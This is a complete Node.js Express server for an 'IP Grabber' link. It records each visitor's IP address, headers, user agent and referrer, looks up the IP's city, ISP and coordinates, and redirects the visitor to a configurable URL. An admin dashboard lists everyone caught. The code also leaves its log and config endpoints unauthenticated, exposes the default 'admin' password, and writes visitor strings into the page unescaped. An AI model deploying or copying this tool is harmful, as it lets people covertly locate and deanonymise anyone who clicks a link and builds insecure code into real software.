const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = path.join(__dirname, 'visitor-logs.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // Serve static files

// Ensure log file exists
async function ensureLogFile() {
    try {
        await fs.access(LOG_FILE);
    } catch {
        await fs.writeFile(LOG_FILE, '[]');
    }
}

// Ensure config file exists
async function ensureConfigFile() {
    try {
        await fs.access(CONFIG_FILE);
    } catch {
        const defaultConfig = {
            redirectUrl: 'https://example.com/',
            siteName: 'IP Logger',
            adminPassword: 'admin',
            createdAt: new Date().toISOString()
        };
        await fs.writeFile(CONFIG_FILE, JSON.stringify(defaultConfig, null, 2));
    }
}

// Get current configuration
async function getConfig() {
    try {
        const configData = await fs.readFile(CONFIG_FILE, 'utf8');
        return JSON.parse(configData);
    } catch {
        return {
            redirectUrl: 'https://example.com/',
            siteName: 'IP Logger',
            adminPassword: 'admin'
        };
    }
}

// Update configuration
async function updateConfig(newConfig) {
    const currentConfig = await getConfig();
    const updatedConfig = { ...currentConfig, ...newConfig, updatedAt: new Date().toISOString() };
    await fs.writeFile(CONFIG_FILE, JSON.stringify(updatedConfig, null, 2));
    return updatedConfig;
}

// Get server-side IP geolocation
async function getServerSideLocation(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
        const data = await response.json();
        
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.city,
                zip: data.zip,
                lat: data.lat,
                lon: data.lon,
                timezone: data.timezone,
                isp: data.isp,
                org: data.org,
                asn: data.as
            };
        }
    } catch (error) {
        console.log('Server-side geolocation failed:', error);
    }
    return null;
}

// Log visitor endpoint
app.post('/log-visitor', async (req, res) => {
    try {
        // Get the real IP address
        const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                        req.headers['x-real-ip'] || 
                        req.connection.remoteAddress || 
                        req.socket.remoteAddress ||
                        req.ip;
        
        // Try to get server-side location if client-side failed
        let serverLocation = null;
        if (!req.body.location?.country && clientIP && !clientIP.startsWith('192.168') && !clientIP.startsWith('10.') && clientIP !== '::1') {
            serverLocation = await getServerSideLocation(clientIP);
        }
        
        const visitorData = {
            ...req.body,
            serverTimestamp: new Date().toISOString(),
            serverIP: clientIP,
            serverLocation: serverLocation,
            headers: {
                'user-agent': req.headers['user-agent'],
                'accept-language': req.headers['accept-language'],
                'x-forwarded-for': req.headers['x-forwarded-for'],
                'x-real-ip': req.headers['x-real-ip'],
                'cf-connecting-ip': req.headers['cf-connecting-ip'], // Cloudflare
                'x-client-ip': req.headers['x-client-ip']
            }
        };

        // Read existing logs
        const logs = JSON.parse(await fs.readFile(LOG_FILE, 'utf8'));
        
        // Add new log
        logs.push(visitorData);
        
        // Keep only last 1000 entries
        if (logs.length > 1000) {
            logs.splice(0, logs.length - 1000);
        }
        
        // Save logs
        await fs.writeFile(LOG_FILE, JSON.stringify(logs, null, 2));
        
        console.log('New visitor logged:', {
            ip: visitorData.publicIP || visitorData.serverIP,
            location: visitorData.location?.city + ', ' + visitorData.location?.country,
            userAgent: visitorData.userAgent?.substring(0, 50) + '...',
            timestamp: visitorData.timestamp
        });
        
        res.json({ success: true, message: 'Visitor logged successfully' });
        
    } catch (error) {
        console.error('Error logging visitor:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get configuration endpoint
app.get('/admin/config', async (req, res) => {
    try {
        const config = await getConfig();
        res.json(config);
    } catch (error) {
        console.error('Error reading config:', error);
        res.status(500).json({ error: error.message });
    }
});

// Update configuration endpoint
app.post('/admin/config', async (req, res) => {
    try {
        const updatedConfig = await updateConfig(req.body);
        res.json({ success: true, config: updatedConfig });
    } catch (error) {
        console.error('Error updating config:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Clear logs endpoint
app.delete('/admin/logs', async (req, res) => {
    try {
        await fs.writeFile(LOG_FILE, '[]');
        console.log('All visitor logs cleared');
        res.json({ success: true, message: 'All logs cleared successfully' });
    } catch (error) {
        console.error('Error clearing logs:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get redirect URL for the frontend
app.get('/api/redirect-url', async (req, res) => {
    try {
        const config = await getConfig();
        res.json({ redirectUrl: config.redirectUrl });
    } catch (error) {
        res.json({ redirectUrl: 'https://example.com/' });
    }
});

// View logs endpoint (protected - add authentication in production)
app.get('/admin/logs', async (req, res) => {
    try {
        const logs = JSON.parse(await fs.readFile(LOG_FILE, 'utf8'));
        
        // Filter by date or limit
        const { since, limit = 50 } = req.query;
        let filteredLogs = logs;
        
        if (since) {
            const sinceDate = new Date(since);
            filteredLogs = logs.filter(log => new Date(log.timestamp) >= sinceDate);
        }
        
        // Return most recent logs first
        const recentLogs = filteredLogs.slice(-limit).reverse();
        
        res.json({
            total: logs.length,
            filtered: recentLogs.length,
            logs: recentLogs
        });
        
    } catch (error) {
        console.error('Error reading logs:', error);
        res.status(500).json({ error: error.message });
    }
});

// Admin dashboard
app.get('/admin', async (req, res) => {
    const { password } = req.query;
    const config = await getConfig();
    
    // Check password
    if (password !== config.adminPassword) {
        return res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Login</title>
                <meta charset="UTF-8">
                <style>
                    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
                    .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 400px; width: 100%; }
                    .form-group { margin-bottom: 20px; }
                    .form-group label { display: block; margin-bottom: 8px; font-weight: 500; }
                    .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
                    .btn { background: #667eea; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%; }
                    .btn:hover { background: #5a6fd8; }
                    .error { color: #dc3545; text-align: center; margin-bottom: 20px; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h2 style="text-align: center; margin-bottom: 30px;">Admin Access</h2>
                    ${password ? '<div class="error">Invalid password. Please try again.</div>' : ''}
                    <form method="get">
                        <div class="form-group">
                            <label for="password">Password:</label>
                            <input type="password" id="password" name="password" required autofocus>
                        </div>
                        <button type="submit" class="btn">Login</button>
                    </form>
                    <p style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
                        Default password: admin
                    </p>
                </div>
            </body>
            </html>
        `);
    }
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Visitor Logs Dashboard</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
            .stat-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .stat-number { font-size: 2rem; font-weight: bold; color: #667eea; }
            .stat-label { color: #666; font-size: 0.9rem; }
            .logs-table { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            table { width: 100%; border-collapse: collapse; }
            th { background: #667eea; color: white; padding: 12px; text-align: left; }
            td { padding: 12px; border-bottom: 1px solid #eee; }
            .ip { font-family: monospace; font-weight: bold; }
            .location { color: #666; }
            .timestamp { color: #999; font-size: 0.9rem; }
            .refresh-btn { background: #667eea; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 0 5px; }
            .refresh-btn:hover { background: #5a6fd8; }
            .config-panel { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
            .config-form label { display: block; font-weight: bold; margin-bottom: 5px; }
            .success-msg { background: #d4edda; color: #155724; padding: 10px; border-radius: 4px; margin: 10px 0; border: 1px solid #c3e6cb; }
            .error-msg { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 4px; margin: 10px 0; border: 1px solid #f5c6cb; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Visitor Logs Dashboard</h1>
                <div style="display: flex; gap: 10px; align-items: center;">
                    <button class="refresh-btn" onclick="location.reload()">Refresh</button>
                    <button class="refresh-btn" onclick="clearAllLogs()" style="background: #dc3545;">Clear Logs</button>
                    <button class="refresh-btn" onclick="toggleConfig()" style="background: #28a745;">Settings</button>
                </div>
            </div>
            
            <div id="configPanel" class="config-panel" style="display: none;">
                <h3>Configuration</h3>
                <div class="config-form">
                    <label for="redirectUrl">Redirect URL:</label>
                    <input type="url" id="redirectUrl" placeholder="https://example.com/" style="width: 100%; padding: 8px; margin: 5px 0 15px 0; border: 1px solid #ddd; border-radius: 4px;">
                    
                    <label for="siteName">Site Name:</label>
                    <input type="text" id="siteName" placeholder="IP Logger" style="width: 100%; padding: 8px; margin: 5px 0 15px 0; border: 1px solid #ddd; border-radius: 4px;">
                    
                    <button onclick="saveConfig()" class="refresh-btn" style="background: #007bff;">Save Changes</button>
                    <button onclick="toggleConfig()" class="refresh-btn" style="background: #6c757d;">Cancel</button>
                </div>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number" id="totalVisits">-</div>
                    <div class="stat-label">Total Visits</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="todayVisits">-</div>
                    <div class="stat-label">Today's Visits</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="uniqueIPs">-</div>
                    <div class="stat-label">Unique IPs</div>
                </div>
            </div>
            
            <div class="logs-table">
                <table>
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>IP Address</th>
                            <th>Location</th>
                            <th>User Agent</th>
                            <th>Referrer</th>
                        </tr>
                    </thead>
                    <tbody id="logsTable">
                        <tr><td colspan="5">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>

        <script>
            let currentConfig = {};
            
            async function loadConfig() {
                try {
                    const response = await fetch('/admin/config');
                    const config = await response.json();
                    currentConfig = config;
                    
                    document.getElementById('redirectUrl').value = config.redirectUrl || '';
                    document.getElementById('siteName').value = config.siteName || '';
                    
                    // Update page title
                    document.title = config.siteName + ' - Dashboard' || 'IP Logger - Dashboard';
                    
                } catch (error) {
                    console.error('Error loading config:', error);
                }
            }
            
            function toggleConfig() {
                const panel = document.getElementById('configPanel');
                if (panel.style.display === 'none') {
                    panel.style.display = 'block';
                    loadConfig();
                } else {
                    panel.style.display = 'none';
                }
            }
            
            async function saveConfig() {
                const redirectUrl = document.getElementById('redirectUrl').value;
                const siteName = document.getElementById('siteName').value;
                
                if (!redirectUrl || !redirectUrl.startsWith('http')) {
                    alert('Please enter a valid URL starting with http:// or https://');
                    return;
                }
                
                try {
                    const response = await fetch('/admin/config', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ redirectUrl, siteName })
                    });
                    
                    const result = await response.json();
                    
                    if (result.success) {
                        showMessage('Configuration saved successfully!', 'success');
                        toggleConfig();
                        loadConfig();
                    } else {
                        showMessage('Error saving configuration: ' + result.error, 'error');
                    }
                    
                } catch (error) {
                    showMessage('Error saving configuration: ' + error.message, 'error');
                }
            }
            
            async function clearAllLogs() {
                if (!confirm('Are you sure you want to clear ALL visitor logs? This action cannot be undone.')) {
                    return;
                }
                
                try {
                    const response = await fetch('/admin/logs', { method: 'DELETE' });
                    const result = await response.json();
                    
                    if (result.success) {
                        showMessage('All logs cleared successfully!', 'success');
                        loadLogs();
                    } else {
                        showMessage('Error clearing logs: ' + result.error, 'error');
                    }
                    
                } catch (error) {
                    showMessage('Error clearing logs: ' + error.message, 'error');
                }
            }
            
            function showMessage(message, type) {
                const messageDiv = document.createElement('div');
                messageDiv.className = type === 'success' ? 'success-msg' : 'error-msg';
                messageDiv.textContent = message;
                
                const container = document.querySelector('.container');
                container.insertBefore(messageDiv, container.firstChild);
                
                setTimeout(() => {
                    messageDiv.remove();
                }, 5000);
            }
            
            async function loadLogs() {
                try {
                    const response = await fetch('/admin/logs?limit=100');
                    const data = await response.json();
                    
                    // Update stats
                    document.getElementById('totalVisits').textContent = data.total;
                    
                    const today = new Date().toDateString();
                    const todayCount = data.logs.filter(log => 
                        new Date(log.timestamp).toDateString() === today
                    ).length;
                    document.getElementById('todayVisits').textContent = todayCount;
                    
                    const uniqueIPs = new Set(data.logs.map(log => log.publicIP || log.serverIP)).size;
                    document.getElementById('uniqueIPs').textContent = uniqueIPs;
                    
                    // Update table
                    const tbody = document.getElementById('logsTable');
                    tbody.innerHTML = data.logs.map(log => {
                        const timestamp = new Date(log.timestamp).toLocaleString();
                        const ip = log.publicIP || log.serverIP || 'Unknown';
                        
                        // Try to get location from multiple sources
                        let location = 'Unknown';
                        const clientLocation = log.location;
                        const serverLocation = log.serverLocation;
                        
                        if (clientLocation?.city && clientLocation?.country) {
                            location = \`\${clientLocation.city}, \${clientLocation.region ? clientLocation.region + ', ' : ''}\${clientLocation.country}\`;
                        } else if (serverLocation?.city && serverLocation?.country) {
                            location = \`\${serverLocation.city}, \${serverLocation.region ? serverLocation.region + ', ' : ''}\${serverLocation.country}\`;
                        } else if (clientLocation?.country) {
                            location = clientLocation.country;
                        } else if (serverLocation?.country) {
                            location = serverLocation.country;
                        } else if (log.timezone) {
                            location = \`Timezone: \${log.timezone}\`;
                        }
                        
                        const userAgent = log.userAgent ? 
                            log.userAgent.substring(0, 60) + (log.userAgent.length > 60 ? '...' : '') : 
                            'Unknown';
                        const referrer = log.referrer || 'Direct';
                        
                        return \`
                            <tr>
                                <td class="timestamp">\${timestamp}</td>
                                <td class="ip">\${ip}</td>
                                <td class="location">\${location}</td>
                                <td>\${userAgent}</td>
                                <td>\${referrer}</td>
                            </tr>
                        \`;
                    }).join('');
                    
                } catch (error) {
                    console.error('Error loading logs:', error);
                    document.getElementById('logsTable').innerHTML = 
                        '<tr><td colspan="5">Error loading logs</td></tr>';
                }
            }
            
            // Initialize dashboard
            loadLogs();
            loadConfig();
            
            // Auto-refresh every 30 seconds
            setInterval(loadLogs, 30000);
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// Start server
async function startServer() {
    await ensureLogFile();
    await ensureConfigFile();
    
    app.listen(PORT, () => {
        console.log(`🟢 IP Grabber server running on http://localhost:${PORT}`);
        console.log(`🟢 Admin dashboard: http://localhost:${PORT}/admin`);
        console.log(`🟢 Logs API: http://localhost:${PORT}/admin/logs`);
    });
}

startServer().catch(console.error);